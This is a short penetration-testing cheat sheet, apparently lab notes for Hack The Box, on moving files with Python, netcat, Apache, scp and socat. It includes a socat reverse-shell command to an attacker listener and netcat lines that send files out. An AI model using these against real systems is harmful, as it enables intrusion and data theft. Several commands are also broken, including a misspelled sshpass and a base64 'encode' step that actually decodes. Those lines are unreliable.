---
description: Listeners and binaries
icon: person-to-portal
---

# File Transfer

{% tabs %}
{% tab title="Python Web Server" %}
{% code title="Host" %}
```sh
python3 -m http.server
```
{% endcode %}

{% code title="Client" %}
```sh
curl -o IP:Port/file
wget <ip>/<archivo>
```
{% endcode %}
{% endtab %}

{% tab title="Netcat" %}
{% code title="Client" %}
```sh
nc <Target_IP> <port> < file
```
{% endcode %}

{% code title="Host" %}
```sh
nc -lvp <Local_IP> > file
```
{% endcode %}

{% code title="" %}
```sh
cat <file> | nc Target_IP 443
```
{% endcode %}
{% endtab %}

{% tab title="Apache" %}
```
cp archivo.txt /var/www/html
```
{% endtab %}

{% tab title="SSH" %}
{% code title="Scapy" %}
```sh
shpass -p <password> scp <filename> admin@2million.htb:/tmp/
```
{% endcode %}
{% endtab %}

{% tab title="Socat" %}
{% code title="Listener" %}
```sh
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
{% endcode %}

{% code title="Target Machine" %}
```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
* <mark style="color:purple;">Check hashes to avoid file corruption</mark>

```sh
md5sum <file>
```

* <mark style="color:purple;">Using</mark> <mark style="color:orange;">**`base64`**</mark> <mark style="color:purple;">help to keep file integrity</mark>

{% code title="Pipe text in to a file" %}
```sh
echo "texto_base_64" | base64 -d > <file>
```
{% endcode %}

{% code title="Pipe file in to base64" %}
```sh
cat <file> | base64 -d > <file>
```
{% endcode %}
{% endhint %}

### <mark style="color:purple;">**Useful Binaries:**</mark>

{% embed url="https://github.com/andrew-d/static-binaries" %}
